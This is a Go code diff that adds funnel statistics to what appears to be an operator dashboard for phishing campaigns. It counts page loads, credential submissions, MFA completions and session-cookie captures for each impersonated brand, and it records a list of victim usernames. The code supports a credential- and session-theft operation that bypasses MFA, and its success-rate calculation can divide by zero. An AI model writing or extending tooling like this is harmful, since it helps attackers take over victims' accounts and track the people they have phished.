@@ -20,6 +20,7 @@ type CaptureEvent struct {
 	UserAgent  string `json:"user_agent"`
 	Status     string `json:"status"`
 	Source     string `json:"source"`
+	EventType  string `json:"event_type"`
 }
 
 // CampaignStats holds aggregated stats for one campaign.
@@ -31,6 +32,19 @@ type CampaignStats struct {
 	Failures   int
 	Rate       float64
 	LastSeen   string
+}
+
+// CampaignFunnel holds funnel-stage counts per campaign.
+type CampaignFunnel struct {
+	CampaignID    string   `json:"campaign_id"`
+	Brand         string   `json:"brand"`
+	PageLoads     int      `json:"page_loads"`
+	CredSubmits   int      `json:"cred_submits"`
+	MfaCompletes  int      `json:"mfa_completes"`
+	CookieCaptures int     `json:"cookie_captures"`
+	SuccessRate   float64  `json:"success_rate"`
+	LastSeen      string   `json:"last_seen"`
+	Victims       []string `json:"victims"`
 }
 
 // IPStats holds per-IP summary.
@@ -47,6 +61,7 @@ type DashboardData struct {
 	UniqueIPs       int
 	ActiveCampaigns int
 	Campaigns       []CampaignStats
+	Funnels         []CampaignFunnel
 	TopIPs          []IPStats
 	Recent          []CaptureEvent
 	GeneratedAt     string
@@ -91,6 +106,7 @@ func aggregate(events []CaptureEvent) *DashboardData {
 		Brand string
 	}
 	campMap := map[campKey]*CampaignStats{}
+	funnelMap := map[campKey]*CampaignFunnel{}
 	ipMap := map[string]*IPStats{}
 	successes := 0
 
@@ -111,6 +127,38 @@ func aggregate(events []CaptureEvent) *DashboardData {
 		}
 		if ev.Timestamp > cs.LastSeen {
 			cs.LastSeen = ev.Timestamp
+		}
+
+		// Funnel tracking by event_type
+		if funnelMap[ck] == nil {
+			funnelMap[ck] = &CampaignFunnel{CampaignID: ev.CampaignID, Brand: ev.Brand}
+		}
+		fn := funnelMap[ck]
+		switch ev.EventType {
+		case "page_load":
+			fn.PageLoads++
+		case "credential_submit":
+			fn.CredSubmits++
+		case "mfa_complete":
+			fn.MfaCompletes++
+		case "cookie_capture":
+			fn.CookieCaptures++
+		}
+		if ev.Timestamp > fn.LastSeen {
+			fn.LastSeen = ev.Timestamp
+		}
+		// Track unique victims
+		if ev.Username != "" {
+			found := false
+			for _, v := range fn.Victims {
+				if v == ev.Username {
+					found = true
+					break
+				}
+			}
+			if !found {
+				fn.Victims = append(fn.Victims, ev.Username)
+			}
 		}
 
 		if ipMap[ev.IP] == nil {
@@ -136,6 +184,18 @@ func aggregate(events []CaptureEvent) *DashboardData {
 	}
 	sort.Slice(dd.Campaigns, func(i, j int) bool {
 		return dd.Campaigns[i].LastSeen > dd.Campaigns[j].LastSeen
+	})
+
+	// Build funnel list with success rates
+	for _, fn := range funnelMap {
+		total := fn.PageLoads + fn.CredSubmits + fn.MfaCompletes + fn.CookieCaptures
+		if total > 0 {
+			fn.SuccessRate = float64(fn.MfaCompletes) / float64(fn.PageLoads) * 100
+		}
+		dd.Funnels = append(dd.Funnels, *fn)
+	}
+	sort.Slice(dd.Funnels, func(i, j int) bool {
+		return dd.Funnels[i].LastSeen > dd.Funnels[j].LastSeen
 	})
 
 	for _, is := range ipMap {
